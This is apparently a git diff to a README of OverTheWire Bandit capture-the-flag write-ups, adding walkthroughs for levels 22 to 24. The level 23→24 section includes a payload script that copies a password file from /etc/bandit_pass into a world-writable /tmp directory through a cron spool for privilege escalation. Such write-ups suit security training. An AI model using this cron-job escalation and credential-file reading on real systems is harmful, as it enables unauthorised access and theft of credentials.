@@ -1,6 +1,6 @@
 # 🛡️ OverTheWire Bandit: Cybersecurity & Linux CLI Write-ups
 
-Welcome to the **OverTheWire Bandit** write-ups repository. This project documents hands-on solutions, Linux command-line mechanics, data manipulation techniques, and foundational security concepts learned while completing Levels 0 through 22.
+Welcome to the **OverTheWire Bandit** write-ups repository. This project documents hands-on solutions, Linux command-line mechanics, data manipulation techniques, and foundational security concepts learned while completing Levels 0 through 24.
 
 ## 📌 Table of Contents
 
@@ -30,6 +30,8 @@ Welcome to the **OverTheWire Bandit** write-ups repository. This project documen
   * [Level 19 → 20](#level-19--20)
   * [Level 20 → 21](#level-20--21)
   * [Level 21 → 22](#level-21--22)
+  * [Level 22 → 23](#level-22--23)
+  * [Level 23 → 24](#level-23--24)
 * [⚠️ Disclaimer](#️-disclaimer)
 
 ## 📊 Progress Tracker
@@ -59,6 +61,8 @@ Welcome to the **OverTheWire Bandit** write-ups repository. This project documen
 | **19 → 20** | Privilege escalation via SUID binary execution | `./bandit20-do` | [Writeup](#level-19--20) | ✅ Completed |
 | **20 → 21** | SUID binary interaction via Netcat listener & background jobs | `nc -l -p`, `&`, `./suconnect` | [Writeup](#level-20--21) | ✅ Completed |
 | **21 → 22** | Auditing scheduled Cron jobs & exposed `/tmp` files | `ls /etc/cron.d/`, `cat` | [Writeup](#level-21--22) | ✅ Completed |
+| **22 → 23** | Reverse-engineering Cron job scripts & MD5 hash filenames | `md5sum`, `cut`, `cat` | [Writeup](#level-22--23) | ✅ Completed |
+| **23 → 24** | Privilege escalation via arbitrary Cron job script execution | `mkdir`, `chmod 777`, `cat << 'EOF'` | [Writeup](#level-23--24) | ✅ Completed |
 
 ## 🛠️ Environment & Tooling
 
@@ -326,6 +330,41 @@ cat /usr/bin/cronjob_bandit22.sh
 cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ```
 * **Key Takeaway:**  Auditing /etc/cron.d/ reveals automated scripts running with elevated user privileges; writing sensitive data to world-readable /tmp files (chmod 644) leads to information disclosure
+
+### Level 22 → 23
+
+* **Goal:**  Reverse-engineer the cronjob_bandit23.sh script to compute the MD5-hashed filename in /tmp where bandit23's password is written.
+* **Commands Executed:**
+ ```bash
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+```
+* **Key Takeaway:** Security through obscurity fails when automated scripts are readable; replicating the script's logic (echo I am user bandit23 | md5sum) predicts the target file path in /tmp.
+
+### Level 23 → 24
+
+* **Goal:**  Exploit the cronjob_bandit24.sh automated task by placing a custom Bash script inside /var/spool/bandit24/foo/ to copy bandit24's password into an accessible /tmp directory.
+* **Commands Executed:**
+ ```bash
+# Step 1: Create a world-writable workspace in /tmp for the output
+mkdir /tmp/myjob24
+chmod 777 /tmp/myjob24
+
+# Step 2: Write the payload script and make it executable
+cat << 'EOF' > /tmp/myjob24/getpass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/myjob24/pass.txt
+EOF
+chmod 777 /tmp/myjob24/getpass.sh
+
+# Step 3: Copy the script into the scheduled spool directory and wait 1 minute
+cp /tmp/myjob24/getpass.sh /var/spool/bandit24/foo/
+cat /tmp/myjob24/pass.txt
+```
+* **Key Takeaway:** Scheduled Cron jobs that automatically execute user-supplied scripts from shared directories without validation lead directly to vertical privilege escalation.
+
 ## ⚠️ Disclaimer
 
 In accordance with ethical write-up standards for cybersecurity wargames, all actual passwords and flags have been strictly redacted. This repository focuses solely on methodology, command mechanics, and problem-solving logic.
